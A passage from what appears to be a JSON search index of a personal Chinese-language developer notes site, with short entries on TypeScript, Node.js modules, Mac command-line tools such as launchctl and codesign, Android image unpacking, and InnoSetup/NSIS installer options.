TS2564: Property 'country' has no initializer and is not definitely assigned in the constructor. 如果我们不想在初始化的时候为country赋值，此时就可以用 ! 修饰该属性: class Person { name: string; country!: string; constructor() { this.name = 'Louis'; } } 非空断言操作符(Non-null Assertion Operator) 在编辑器中当参数可能为空(null or undefined)时, 调用可能会有警告/错误, 这个时候可以使用 ! 表示一定不为空(不会改变代码的运行时行为): function liveDangerously(x?: number | null) { // No error console.log(x!.toFixed()); }","tags":"前端","url":"/yq-doc-source-docs-front-end-TypeScript-Question-mark-and-exclamation-mark.html","loc":"/yq-doc-source-docs-front-end-TypeScript-Question-mark-and-exclamation-mark.html"},{"title":"ts源码调试","text":"例如在 WebStrome 工具, 需要在 tsconfig.json 设置 sourceMap 为 true sourceMap 选项用于控制 TypeScript 编译时是否生成源码映射文件(.map 文件) sourceMap 的作用主要有: 源码调试 - sourceMap 提供了映射关系,可以在浏览器的调试工具中直接调试 TypeScript 源代码,而不是编译后的 JavaScript 代码。 错误定位 - 通过 sourceMap 定位到 TypeScript 源码中的错误位置,而不是编译后的 JavaScript 中的位置。 源码映射 - 在浏览器中可以映射回原始的 TypeScript 源码,方便调试分析。 源码压缩 - 即使 JavaScript 代码被压缩/合并/精简过,也可以使用 sourceMap 映射回原始代码。 更好的可读性 - 源码映射使得编译后的代码可读性更高。 代码转换跟踪 - sourceMap 记录了代码转换的整个过程,可以看到代码转换前后的对应关系 注解 这只是一个参考, 并不是开启了一定可以用","tags":"前端","url":"/yq-doc-source-docs-front-end-TypeScript-TS-source-code-debugging.html","loc":"/yq-doc-source-docs-front-end-TypeScript-TS-source-code-debugging.html"},{"title":"tsc","text":"注解 考虑过是不是直接放在linux指令下面, 想了下只是TypeScript适用, 罢手 编译ts文件为js文件, 支持同时多个文件 安装: npm install typescript -g 选项/参数 --help 显示帮助信息 --module 载入扩展模块 --target 设置 ECMA 版本 --declaration 额外生成一个 .d.ts 扩展名的文件 如生成 ts-hw.d.ts、ts-hw.js 两个文件: tsc ts-hw.ts --declaration --removeComments 删除文件的注释 --out 编译多个文件并合并到一个输出的文件 --sourcemap 生成一个 sourcemap (.map) 文件. sourcemap 是一个存储源代码与编译代码对应位置映射的信息文件 --module noImplicitAny 在表达式和声明上有隐含的 any 类型时报错 --watch 在监视模式下运行编译器。会监视输出文件，在它们改变时重新编译。 tsconfig.json配置 strictPropertyInitialization 严格检查类属性是否有初始值 不知道是否是更新了ts版本的缘故, 使用依赖注入框架时候, 如果 没给初始值, 会误报, tsconfig中配置此属性值为false, 来不进行这种检查.","tags":"前端","url":"/yq-doc-source-docs-front-end-TypeScript-TSC.html","loc":"/yq-doc-source-docs-front-end-TypeScript-TSC.html"},{"title":"TypeScript 函数","text":"可选参数 可选参数: function buildName(firstName: string, lastName?: string) { if (lastName) return firstName + \" \" + lastName; else return firstName; } lastName加问号表示是一个可选参数, 可选参数必须跟在必需参数后面, 也可以直接给一个默认值: function function_name(param1[:type],param2[:type] = default_value) { } 剩余参数 使用 ... , 类似Python的 *args 有一种情况，我们不知道要向函数传入多少个参数，这时候我们就可以使用剩余参数来定义。 剩余参数语法允许我们将一个不确定数量的参数作为一个数组传入: function buildName(firstName: string, ...restOfName: string[]) { return firstName + \" \" + restOfName.join(\" \"); } let employeeName = buildName(\"Joseph\", \"Samuel\", \"Lucas\", \"MacKinzie\");","tags":"前端","url":"/yq-doc-source-docs-front-end-TypeScript-function.html","loc":"/yq-doc-source-docs-front-end-TypeScript-function.html"},{"title":"内置对象","text":"process process 是 Node.js 环境中的一个全局对象，提供了与当前进程相关的信息和功能。 它不是在浏览器环境下使用的，而是在 服务器端或命令行环境 下使用的。 process 对象包含了许多属性和方法，用于获取和操作与当前进程相关的信息。 以下是一些常用的 process 属性和方法： process.argv 返回一个包含命令行参数的数组。 第一个元素是 Node.js 的可执行文件路径; 第二个元素是当前执行的 JavaScript 文件路径; 后续元素是传递给脚本的命令行参数 process.env 返回一个包含当前进程环境变量的对象。 process.cwd() 返回当前工作目录的路径。 process.exit([code]) 终止当前进程的执行。可选的 code 参数用于指定进程的退出状态码。 process.pid 返回当前进程的进程 ID。 process.platform 返回一个表示当前操作系统平台的字符串。 process.stdout 和 process.stderr 提供对标准输出和标准错误输出流的访问。","tags":"前端","url":"/yq-doc-source-docs-front-end-node-Built--in-object.html","loc":"/yq-doc-source-docs-front-end-node-Built--in-object.html"},{"title":"node启动常见参数","text":"--remote-debug-port= <port> 旧版调试参数; 使用旧的 Legacy 协议,功能较少 --inspect= <port> 新版支持调试参数; 当使用node时, 有时候需要启动断点调试功能, 这个时候可以使用此参数, 然后在这个端口进行调试; 可以在 Chrome 浏览器中通过 chrome://inspect 访问调试地址 --inspect-brk= <port> 当使用node时, 有时候需要启动断点调试功能, 这个时候可以使用此参数, 然后在这个端口进行调试; 与 --inspect 相比, 会在启动时暂停 端口调试工具 WebStorm VS VSCode WebStorm仅支持单个端口的调试: 而VSCode支持多端口同时多断点启动:","tags":"前端","url":"/yq-doc-source-docs-front-end-node-Node-starts-common-parameters.html","loc":"/yq-doc-source-docs-front-end-node-Node-starts-common-parameters.html"},{"title":"child_process","text":"官网:: Child Process 子进程操作相关模块 创建子进程方式: spawn : 启动一个子进程来执行命令； exec : 启动一个子进程来执行命令，与 spawn 不同的是，它有一个回调函数获知子进程的状况； execFile : 启动一个子进程来执行可执行文件； fork : 与 spawn 类似，不同点在于它创建 Node 的子进程只需指定要执行的 JavaScript 文件模块即可； 注解 exec , execFile , fork 底层都是通过 spawn 实现 spawn exec 基本使用: const {exec} = require('child_process'); exec('ls', (error, stdout, stderr) => { // do ... }); 其中, (error, stdout, stderr) 对应类型如下: error: ExecException | null, // ExecException只是一个接口, 通用属性有四个: // cmd?: string | undefined; // killed?: boolean | undefined; // code?: number | undefined; // signal?: NodeJS.Signals | undefined; stdout: str, stderr: str, 高级一点用法, 对输出进行监听: exec('ls').stdout.on('data', data => { console.log(data); }); execFile 例: const child_process = require('child_process'); child_process.execFile('ls', ['./'], (error, stdout, stderr) => { /// do ... console.log(error, stdout, stderr); }); fork 支持的事件 close 事件: 子进程的 stdio 流关闭时触发； disconnect 事件: 事件在父进程手动调用 child.disconnect 函数时触发； error 事件: 产生错误时会触发； exit 事件: 子进程自行退出时触发； message 事件: 它在子进程使用 process.send() 函数来传递消息时触发； 事件使用 on 调用: exec('ls').stdout.on('exit', (code, signal) => { console.log(code); });","tags":"前端","url":"/yq-doc-source-docs-front-end-node-Standard-library-Child_prCess.html","loc":"/yq-doc-source-docs-front-end-node-Standard-library-Child_prCess.html"},{"title":"ajv","text":"json-schema: 用来描述 json 长什么样数据格式 ajv 是一个校验 json-schema 的数据格式工具 json-schema 默认含有下面 6 种数据结构 string number object array boolean null 使用用例: const Ajv = require(\"ajv\") const ajv = new Ajv() const schemaStr = '{\"type\":\"object\",\"description\":\"Windows specific launch configuration attributes.\",\"properties\":{\"env\":{\"additionalProperties\":{\"type\":\"string\"},\"default\":{},\"description\":\"Environment variables defined as a key value pair. Property ends up being the Environment Variable and the value of the property ends up being the value of the Env Variable.\",\"type\":\"object\",\"pattern\":\"&#94;(?!.*\\\\\\\\$\\\\\\\\{(env|config|command)\\\\\\\\.)\",\"patternErrorMessage\":\"\\'env.\\', \\'config.\\' and \\'command.\\' are deprecated, use \\'env:\\', \\'config:\\' and \\'command:\\' instead.\"}},\"pattern\":\"&#94;(?!.*\\\\\\\\$\\\\\\\\{(env|config|command)\\\\\\\\.)\",\"patternErrorMessage\":\"\\'env.\\', \\'config.\\' and \\'command.\\' are deprecated, use \\'env:\\', \\'config:\\' and \\'command:\\' instead.\"}' const schema = JSON.parse(schemaStr) // const schema = { // type: \"object\", // description: 'test o', // properties: { // env: { // additionalProperties: {type: 'string'}, // default: {}, // description: 'env o', // type: 'object', // pattern: \"&#94;(?!.*\\\\$\\\\{(env|config|command)\\\\.)\" // } // }, // pattern: \"&#94;(?!.*\\\\$\\\\{(env|config|command)\\\\.)\" // } const data = {env: {\"1\": \"1\"}} // const valid = ajv.validate(schema, data) const validRule = ajv.compile(schema) const valid = validRule(data) if (!valid) console.log(ajv.errors); else console.log('suc', valid)","tags":"前端","url":"/yq-doc-source-docs-front-end-node-Three--party-library-AJV.html","loc":"/yq-doc-source-docs-front-end-node-Three--party-library-AJV.html"},{"title":"AnchorJS","text":"针对文档项目的索引吧. 官网: anchorjs-doc 安装/使用 npm: // npm install anchor-js import AnchorJS from 'anchor-js'; const anchors = new AnchorJS(); anchors.add(); cdn: <script src=\"https://cdn.jsdelivr.net/npm/anchor-js/anchor.min.js\"></script> <script> anchors.add(); </script> js file: import 'https://cdn.jsdelivr.net/npm/anchor-js/anchor.min.js'; anchors.add(); 一些方法 建议在文档全部加载完成之前使用: <!-- Add anchors before the closing body tag. --> <script> anchors.add(); </script> </body> 或者: // Add anchors on DOMContentLoaded document.addEventListener('DOMContentLoaded', function(event) { anchors.add(); });","tags":"前端","url":"/yq-doc-source-docs-front-end-node-Three--party-library-Anchorjs.html","loc":"/yq-doc-source-docs-front-end-node-Three--party-library-Anchorjs.html"},{"title":"lodash","text":"节流与消抖 节流(throttle): n 秒内只运行一次，若在 n 秒内重复触发，只有一次生效 消抖(debounce): n 秒后在执行该事件，若在 n 秒内被重复触发，则重新计时 参考: https://vue3js.cn/interview/JavaScript/debounce_throttle.html#代码实现 重要 此库提供的节流与消抖, 是一个回调而不是函数调用. 类似于: const Sleep = (ms: number)=> { return new Promise(resolve=>setTimeout(resolve, ms)) } const debounce = async (func, wait: number) => { if (typeof func !== 'function') { throw new TypeError('Expected a function') } // 等待 xxx ms await Sleep(wait); return func } 这里的代码其实有点问题, 没有实现到 重复触发，重新计时 lodash用于节流(throttle)函数的调用频率,以提高性能。 限制指定的时间间隔内最多执行一次原函数。也就是说,它限制了调用函数的频率,避免函数被过于频繁地调用。 使用 lodash.throttle 的好处有: 防止频繁的事件触发导致性能问题,如 resize、scroll 等事件的处理函数。 控制动画或轮询功能的频率,避免过度占用 CPU 资源。 网络请求频率控制,减少不必要的请求量。 输入框实时搜索suggestions时限制请求频率。 例如: import { throttle } from 'lodash'; function handleResize() { // 处理窗口 resize } window.addEventListener('resize', throttle(handleResize, 100)); 这将限制 handleResize 函数每 100ms 至多执行一次,从而提高页面滚动时的性能。","tags":"前端","url":"/yq-doc-source-docs-front-end-node-Three--party-library-lodash.html","loc":"/yq-doc-source-docs-front-end-node-Three--party-library-lodash.html"},{"title":"nodejs下载安装","text":"官网全版本node地址: https://nodejs.org/dist","tags":"前端","url":"/yq-doc-source-docs-front-end-node-node-download-and-install.html","loc":"/yq-doc-source-docs-front-end-node-node-download-and-install.html"},{"title":"镜像文件解包","text":"系统: Mac 用到的工具. simg2img lpunpack 其中 simg2img 直接brew安装即可: brew install simg2img lpunpack 就需要自行去github上找了, 需要找了自己编 第一次找了个c++的, 本地没有编过, 然后找了个py的, 看起来可以, 地址: https://github.com/unix3dgforce/lpunpack 大致用法, 用的是 Redmi K60 的国行线刷包, 下载的文件是官方的tgz格式, 解压后可以找到image下main的 super.img 文件(当前安卓规定的动态分区文件). 可以file查看文件格式: file super.img super.img: Android sparse image, version: 1.0, Total of 2228224 4096-byte output blocks in 141 input chunks. 是 sparse image , 需要使用 simg2img 转换为 raw: simg2img super.img super_raw.img 查看是否成功: file super_raw.img super_raw.img:: data 成功 然后解压分区镜像(我新建了一个data目录放在下面): python3 lpunpack.py super_raw.img data/ 结果: file data/* data/mi_ext_a.img: data data/mi_ext_b.img: empty data/odm_a.img: data data/odm_b.img: empty data/product_a.img: data data/product_b.img: empty data/system_a.img: data data/system_b.img: empty data/system_ext_a.img: data data/system_ext_b.img: empty data/vendor_a.img: data data/vendor_b.img: empty data/vendor_dlkm_a.img: data data/vendor_dlkm_b.img: empty 这里的img文件就是 ext4 格式的镜像了, 最简单的打开方式就是使用linux挂载, 一开始找了很久怎么在Win/Mac系统打开, 都失败了, 最终还是拿到虚拟机去挂载打开的. 注解 windows下的话有个仓库的 simg2img 可以用: https://github.com/KinglyWayne/simg2img_win 里面的ext2不能用.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Android-Mirror-file-dissection-package.html","loc":"/yq-doc-source-docs-operating-system-Android-Mirror-file-dissection-package.html"},{"title":"otool","text":"某种程度上可以看作 /docs/操作系统/linux/linux指令/ldd 的替代, 因为Mac上没有 ldd 指令. iOS应用所依赖的系统库检查 otool(object file displaying tool) 针对目标文件的展示工具，用来发现应用中使用到了哪些系统库，调用了其中哪些方法， 使用了库中哪些对象及属性，它是Xcode自带的常用工具。 常用的命令: -f print the fat headers -a print the archive header -h print the mach header -l print the load commands -L 打印用到的 shared libraries, 就是看用到了哪些动态库 -D print shared library id name -t 打印汇编的text段, 一般需要与-v一起使用(the text section (disassemble with -v)) -p <routine name> start dissassemble from routine name -s <segname> <sectname> print contents of section -d print the data section -o print the Objective-C segment -r print the relocation entries -S print the table of contents of a library -T print the table of contents of a dynamic shared library -M print the module table of a dynamic shared library -R print the reference table of a dynamic shared library -I print the indirect symbol table -H print the two-level hints table -G print the data in code table -v print verbosely (symbolically) when possible -V 打印反汇编符号操作数(disassembled operands symbolically) -c print argument strings of a core file -X print no leading addresses or headers -m don't use archive(member) syntax -B force Thumb disassembly (ARM objects only) -q use llvm's disassembler (the default) -Q use otool(1)'s disassembler -mcpu=arg use `arg' as the cpu for disassembly -j print opcode bytes -P print the info plist section as strings -C print linker optimization hints --version print the version of /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/otool","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-Otool.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-Otool.html"},{"title":"security","text":"访问钥匙串 如: security find-identity -v -p codesigning","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-Security.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-Security.html"},{"title":"codesign","text":"创建和管理证书 用法: codesign -s identity [-fv*] [-o flags] [-r reqs] [-i ident] path ... # 签名 codesign -v [-v*] [-R=<req string>|-R <req file path>] path|[+]pid ... # 验证 codesign -d [options] path ... # 内容显示 codesign -h pid ... # 主机路径显示 codesign --validate-constraint path ... # 检查提供的约束plist (check the supplied constraint plist) 说明: -s 签名 -f force, 强制重新签名 -i 表示修改签名参数 Identifier -o 修改flags -d 是display展示签名信息的意思 -v 是verbose的意思，越多的verbose显示信息越多，通常3个就已经足够了 -vvv --entitlements 授权机制 entitements信息 查看WeChat的签名: codesign -d -vvv WeChat.app 参考: codesign的使用","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-codeSign.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-codeSign.html"},{"title":"gs","text":"ghostscript命令 专门用于处理.ps文件以及PDF相关的文件, 文件直接转换, 质量高 只是简单的可以就使用 /docs/操作系统/Mac/Mac指令/sips","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-company.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-company.html"},{"title":"convert","text":"安装: brew install imagemagick 与 /docs/操作系统/Mac/Mac指令/sips 差不多 convert 是 imagemagick 程序包的命令, convert 其实等价于 magick 执行转换命令只需要传入待转换的图片以及输出的图片文件名即可: convert aa.eps a.ico 支持几乎所有的位图/矢量图格式. 美中不足的一点就是转换的图片质量不高, pdf转png会丢失背景 参考: https://blog.csdn.net/qq_41437512/article/details/122619375","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-convert.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-convert.html"},{"title":"launchctl","text":"MacOS不像 Linux 有 /etc/init.d/rc.local 以及 service 的方式可以设置程序随机启动， 而是使用 plist 文件管理. 你可以写一个plist文件放到 ~/Library/Launch Agents/ 下面， 文件里描述你的程序路径和启动参数， 那么这个用户登录时就会启动这个程序了，而且是杀不了的，被杀了之后会自动重新启动 plist文件分布在: /System/Library/LaunchDaemons/ System-wide daemons provided by OS X 其中 apache的httpd程序启动配置文件 org.apache.httpd.plist 就在这里。 /System/Library/LaunchAgents/ 由Mac OS X为用户定义的任务项 /Library/LaunchDaemons 由管理员定义的守护进程任务项 /Library/LaunchAgents 由管理员为用户定义的任务项 如果放到/Library/Launch Agents/下面的话，就是一开机就启动 ~/Library/LaunchAgents 由用户自己定义的任务 这些配置文件由程序 launchctl 设置是否加载 说明 launchctl 管理 MacOS 的启动脚本，控制启动计算机时需要开启的服务. 也可以设置定时执行特定任务的脚本，就像Linux cron </docs/操作系统/linux/linux指令/crond> 一样. launchctl需要root权限。 常用命令 显示当前的启动脚本: launchctl list 开机时自动启动Apache服务器: sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist 设置开机启动并立即启动改服务: launchctl load -w **.pist 设置开机启动但不立即启动服务: launchctl load **.pist 停止正在运行的启动脚本: sudo launchctl unload [path/to/script] 再加上-w选项即可去除开机启动: sudo launchctl unload -w [path/to/script] 执行定时脚本|设置开机启动步骤: 1. 写执行脚本 （通过 brew 安装软件 brew 会为我们自动生成。） 2. 去对应的目录下建立plist文件 3. 加载服务 > 1 cd 进入指定 plist 文件目录 > 2 launchctl load *.plist #加载 launchctl unload *.plist #取消 > 3 launchctl list #查看服务 还可设置别名便于操作: 1. vim ~/.bash_profile #编辑添加如下脚本 2. 命名别名（以 nginx 为例） > 启动：alias nginx.start='launchctl load -w ~/Library/LaunchAgents/homebrew.mxcl.nginx.plist' > 关闭：alias nginx.stop='launchctl unload -w ~/Library/LaunchAgents/homebrew.mxcl.nginx.plist' > 重启：alias nginx.restart='nginx.stop && nginx.start' 注解 在launchctl list 命令结果中出现的 plist 文件才会有效; Agents文件夹下的plist是需要用户登录后，才会加载的， 而Daemons文件夹下得plist是只要开机，可以不用登录就会被加载 参考: MacOS launchctl 启动进程控制 用例-查找docker进程并关闭 list查找然后关闭和启动它: $ launchctl list | grep docker 111117 0 com.docker.docker.2388 $ launchctl stop com.docker.docker.2388 && launchctl start com.docker.docker.2388","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-launchctl.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-launchctl.html"},{"title":"xcrun","text":"查看sdk路径: $ xcrun --sdk macosx --show-sdk-path /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.2.sdk","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-xcrun.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-xcrun.html"},{"title":"DYLD_INSERT_LIBRARIES","text":"可以用来执行程序运行前首先加载的动态库, 多个使用冒号分割, 与Linux的 /docs/操作系统/linux/Linux环境变量/LD_PRELOAD 基本一致","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-Mac-environment-variable-Dyld_insert_libraries.html","loc":"/yq-doc-source-docs-operating-system-Mac-Mac-environment-variable-Dyld_insert_libraries.html"},{"title":"DYLD_PRINT_LIBRARIES","text":"设置值为1后, 执行程序之前会打印出运行时加载的所有动态库 用例: $ DYLD_PRINT_LIBRARIES=1 ./test2 // 这部分是运行时加载的动态库, 篇幅较长, 此处只截取头尾 dyld[43741]: <DD3BA6F6-FA28-3A28-AA7D-F95D176C25B3> /Users/yanque/project/code/TryTest/test2 dyld[43741]: <683DEB82-6E72-394B-945D-AB3A1A8BE1D8> /Users/yanque/project/code/TryTest/libtest2preutil.dylib ... dyld[43741]: <6F11E645-DB1C-325D-AC28-91740663E4DD> /usr/lib/system/libxpc.dylib dyld[43741]: <7E3B4177-738A-305C-93AA-D9E395B96B9D> /usr/lib/libobjc.A.dylib dyld[43741]: <87B41A1F-8387-3AF3-BB41-C86D4B6A21A5> /usr/lib/liboah.dylib // 下面是执行结果 a + b + 随机值= 10000 + 10090 + 3 = 0 交换a, b的值, 交换前: a: 10000; b: 10090 交换a, b的值, 交换后: a: 10090; b: 10000","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-Mac-environment-variable-Dyld_print_libraries.html","loc":"/yq-doc-source-docs-operating-system-Mac-Mac-environment-variable-Dyld_print_libraries.html"},{"title":"Mac-Vmware磁盘修复","text":"Mac下面个人免费的虚拟机好像只有Vmware的 Vmware Fusion , 有时候由于磁盘空间不足啊等原因可能会 造成 指定的虚拟磁盘需要修复 这个时候好像重启Vmware就可以修复. 若不行: cd /Applications/VMware\\ Fusion.app/Contents/Library/ ./vmware-vdiskmanager -R \"/Users/yanque/Virtual Machines.localized/Ubuntu 64 位 14.04.6.vmwarevm/虚拟磁盘.vmdk\"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-Mac-vmware-disk-repair.html","loc":"/yq-doc-source-docs-operating-system-Mac-Mac-vmware-disk-repair.html"},{"title":"打印运行时加载的动态库","text":"运行前设置环境变量 DYLD_PRINT_LIBRARIES=1 详见: /docs/操作系统/Mac/Mac环境变量/DYLD_PRINT_LIBRARIES","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-The-dynamic-library-loaded-when-printing-runtime.html","loc":"/yq-doc-source-docs-operating-system-Mac-The-dynamic-library-loaded-when-printing-runtime.html"},{"title":"关于安卓模拟器与WSL冲突","text":"参考:: https://blog.csdn.net/weixin_42474261/article/details/125396451 https://www.zhihu.com/question/264353707 wsl Hyper-V 与 安卓模拟器虚拟机同时共存方案 冲浪了一下大概就几种方案: 最新的雷电9已经解决了兼容性问题, 支持共存. 参考: wsl Hyper-V 与 安卓模拟器虚拟机同时共存方案 下载新版 BlueStacks (蓝叠) 国际版. 下载地址: BlueStacksFullInstaller_5.9.410.1001_amd64_native","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-About-Android-simulator-conflict-with-WSL.html","loc":"/yq-doc-source-docs-operating-system-Windows-About-Android-simulator-conflict-with-WSL.html"},{"title":"innosetup构建包","text":"github地址:: jrsoftware/issrc innosetup 是适用于windows的一个免费windows安装程序制作软件. 对于打好的包, 支持不关闭应用程序的静默安装等操作. 配置脚本 innosetup 支持的配置文件为 iss 后缀的文件. 看到一个比较新的中文的配置教程: Inno Setup打包程序 截取了部分: innosetup_code_example 支持的配置: [Setup] section [Setup] section directives [Types] section [Components] section [Tasks] section [Dirs] section [Files] section [Icons] section [INI] section [InstallDelete] section [Languages] section [Messages] section [CustomMessages] section [LangOptions] section [Registry] section [Run] section [UninstallDelete] section [UninstallRun] section 详情见官网: setup script sections <https://jrsoftware.org/ishelp/index.php?topic=consts> 自定义配置代码 若需要加代码之类, 需要增加 [code] 小节, 在其中编码, 支持设置自己的参数. 如, vscode自定义了一个 /update 参数, 使用时候传入标志文件路径: VSCodeUserSetup-x64-1.76.0.exe /verysilent /update=VSCodeUserSetup-x64-1.76.0.flag /nocloseapplications /mergetasks=runcode,!desktopicon,!quicklaunchicon 在代码中获取 /update 的参数, 获取不到则为 false '{param:update|false}' code部分编码语言参考 Pascal (上古语言) 安装包默认支持的参数 官网地址:: Setup Command Line Parameters 对于构建好的包, 启动时支持参数: /silent 静默安装，但如果又报错，还是会提示，并且有进度条 /verysilent 强制静默安装，不管是否报错，都不会有任何提示(注意：如果需要重启电脑，它会不提示而直接重启) /suppressmsgboxes 由 suppress(抑制，镇压) 和 msgboxes(消息框)，组成，表示不提示消息框 /norestart 结合 /verysilent 使用，避免无提示直接重启 /HELP, /? 查看帮助文档 /SP- 隐藏安装提示信息(setup prompt) /ALLUSERS 管理员身份安装 /CURRENTUSER 非管理员身份安装 /LOG=\"filename\" 创建安装日志文件. 可不带参数, 则在用户的 Temp 目录下创建日志文件, debug的时候用处大 /TASKS=\"comma separated list of task names\" 执行定义的task /MERGETASKS=\"comma separated list of task names\" 貌似于上一个一样 ... 其他见官网 附件 innosetup 配置脚本例 一些有点用的文档, 主要是还没来得及看, 先记录: python项目构建: Python_Project_nuitka_inno_setup inno setup技巧篇 软件exe打包压缩常用静默安装参数 常用软件的静默安装参数，双击自动安装 常用软件打包类型及静默安装参数","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-InnOSetup-builds-a-package.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-InnOSetup-builds-a-package.html"},{"title":"NSIS 内置函数","text":"GetTime获取时间 有9个参数, 获取当前本地时间或者文件时间. 语法: ${GetTime} \"[File]\" \"[Option]\" $var1 $var2 $var3 $var4 $var5 $var6 $var7 \"[File]\" ; Ignored if \"L\" or \"LS\" ; \"[Option]\" ; [Options] ; L Local time ; A last Access file time ; C Creation file time ; M Modification file time ; LS System time (UTC) ; AS last Access file time (UTC) ; CS Creation file time (UTC) ; MS Modification file time (UTC) ; $var1 ; Result1: day $var2 ; Result2: month $var3 ; Result3: year $var4 ; Result4: day of week name $var5 ; Result5: hour $var6 ; Result6: minute $var7 ; Result7: seconds eg: Section ${GetTime} \"\" \"L\" $0 $1 $2 $3 $4 $5 $6 ; $0=\"01\" day ; $1=\"04\" month ; $2=\"2005\" year ; $3=\"Friday\" day of week name ; $4=\"16\" hour ; $5=\"05\" minute ; $6=\"50\" seconds MessageBox MB_OK 'Date=$0/$1/$2 ($3)$\\nTime=$4:$5:$6' SectionEnd","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Built--in-function.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Built--in-function.html"},{"title":"常用头文件","text":"MUI.nsh Modern User Interface 是NSIS脚本中一个非常常用的头文件，它提供了一系列现代化的用户界面元素， 包括简单易用的安装向导、控件和页面。使用\"MUI.nsh\"可以轻松地创建具有现代风格的安装程序，而无需编写复杂的代码。 常用的指令: !insertmacro MUI_PAGE_WELCOME：添加欢迎页面。 !insertmacro MUI_PAGE_LICENSE：添加许可证协议页面。 !insertmacro MUI_PAGE_DIRECTORY：添加选择安装位置页面。 !insertmacro MUI_PAGE_INSTFILES：添加文件安装进度页面。 !insertmacro MUI_PAGE_FINISH：添加安装完成页面。 !insertmacro MUI_LANGUAGE：设置安装程序的语言。 如设置安装语言为英文: !insertmacro MUI_LANGUAGE \"English\" 设置为中文: !insertmacro MUI_LANGUAGE \"SimpChinese\"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Common-header-file.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Common-header-file.html"},{"title":"可执行文件选项","text":"此处的可执行文件指的是: 使用 NSIS 脚本打包好的exe可执行文件 一些安装参数 注意, 是对于打包好的exe安装包而言: /NCRC 安装前显示验证数据完整性, 与脚本内使用 CRCCheck on 效果一致 /S 静默安装(授权啥的还是会有提示) /D=<dir> 指定安装目录 (这个实测没效果) 设置默认安装目录: $INSTDIR, 会覆盖掉 InstallDir 和 InstallDirRegKey 若使用, 必须是最后一个参数, 仅支持绝对路径, 不能使用引号(即使有空格) 补充一下当时实测没效果是因为, /D默认会覆盖掉InstallDir, 生效与 `onInit` 前, 但是我测试那个脚本在 `onInit` 又指定了一下 `INSTDIR` , 又覆盖了 `/D` 的, 所以失效. # /help, /? 打印帮助文档 (这个实测也没效果) 官文档没看到有些... 卸载时候的特殊参数: _?=<dir> 设置 $INSTDIR , 指定从这个位置解压 必须是最后的参数, 不能包含引号(即使有空格)","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Executable-file-options.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Executable-file-options.html"},{"title":"语法规范","text":"注释 注释, 使用 # 或者 ; 导入其他脚本 引入自定义脚本文件, 使用 !include !include xxx.nsh 使用dll模块 使用dll提供的函数: plugin::command [parameters] 不止dll, 其他自定义模块也行. 不过都需要先 导入其他脚本 , 使用: nsExec::Exec \"myfile\" 变量 自定义 语法(貌似大小写皆可): Var [/GLOBAL] var_name 变量定义, 使用 Var : Var xxx 注意定义的变量全部都是全局变量, 若定义在函数内部, 必须使用 /GLOBAL 修饰: Var /GLOBAL xxx 还可以使用define !define var_name \"var_str\" 使用define定义的变量只读, 可在当前脚本全局使用. 预定义 寄存器变量(用于参数传递): $0, $1, $2, $3, $4, $5, $6, $7, $8, $9 $R0, $R1, $R2, $R3, $R4, $R5, $R6, $R7, $R8, $R9 # 一开始以为是命令行参数, 看了一下仅是预定义的一些变量, 只是不用显示声明而已 可变预定义变量: $INSTDIR 程序安装路径, 可以使用 StrCpy, ReadRegStr, ReadINIStr, etc 修改 $OUTDIR 当前输出目录 $CMDLINE 安装时候的命令行参数, 为整个命令行, 如: xxx.exe parameter1 parameter2 ... 若需要获取其中的参数, 使用 GetParameters (针对普通参数) , GetOptions (针对选项参数) . 见 获取命令行参数_ 当命令行存在 ``/D`` 选项参数时, ``$CMDLINE`` 为空. $LANGUAGE 当前使用的语言 系统变量 系统变量: $PROGRAMFILES 程序文件目录(通常为 C:\\Program Files 但是运行时会检测). $COMMONFILES 公用文件目录。这是应用程序共享组件的目录(通常为 C:\\Program Files\\Common Files 但是运行时会检测). $DESKTOP Windows 桌面目录(通常为 C:\\windows\\desktop 但是运行时会检测)。该常量的内容(所有用户或当前用户)取决于 SetShellVarContext 设置。默认为当前用户。 $EXEDIR 安装程序运行时的位置。(从技术上来说你可以修改改变量, 但并不是一个好方法). ${NSISDIR} 包含 NSIS 安装目录的一个标记。在编译时会检测到。常用于在你想调用一个在 NSIS 目录下的资源时, 例如: 图标、界面…… $WINDIR Windows 目录(通常为 C:\\windows 或 C:\\winnt 但在运行时会检测) $SYSDIR Windows 系统目录(通常为 C:\\windows\\system 或 